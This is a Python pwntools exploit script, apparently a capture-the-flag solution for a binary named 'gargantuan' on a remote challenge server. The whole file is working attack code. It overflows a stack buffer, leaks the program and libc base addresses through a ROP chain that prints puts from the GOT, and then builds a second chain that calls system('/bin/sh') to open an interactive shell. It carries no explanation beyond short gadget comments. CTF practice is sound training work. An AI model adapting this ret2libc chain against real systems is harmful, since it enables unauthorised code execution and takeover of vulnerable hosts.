#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './gargantuan'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = 'gargantuan.chal.cyberjousting.com', 1352

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
# break *gargantuan+110
break *gargantuan+188
break *gargantuan+242
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()

    for i in range(4):
        sleep(1)
        io.send(f'{i+1}'.encode() * 0x100 + b'\x00')
    sleep(1)
    payload = b'\x00' + cyclic(296 - 1)
    payload += b'\x0b'
    io.send(payload)

    io.recvuntil(b'ATE! 0x')
    elf.address = int(io.recvline().strip(), 16) - elf.sym['gargantuan']

    for i in range(4):
        sleep(1)
        io.send(f'{i+1}'.encode() * 0x100 + b'\x00')
    sleep(1)
    payload = b'\x00' + cyclic(296 - 1)
    payload += flat([
        elf.address + 0x11e0, # pop rdi; ret
        elf.got['puts'],
        elf.plt['puts'],
        elf.sym['gargantuan']
    ])
    io.send(payload)

    io.recvuntil(b'TOO LATE! ')
    io.recvline()
    libc.address = u64(io.recv(6).ljust(8, b'\x00')) - libc.sym['puts']

    for i in range(4):
        sleep(1)
        io.send(f'{i+1}'.encode() * 0x100 + b'\x00')
    sleep(1)
    payload = b'\x00' + cyclic(296 - 1)
    payload += flat([
        elf.address + 0x11e0, # pop rdi; ret
        next(libc.search(b'/bin/sh\x00')),
        elf.address + 0x1016, # ret
        libc.sym['system']
    ])
    io.send(payload)

    log.success('elf base: %#x', elf.address)
    log.success('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()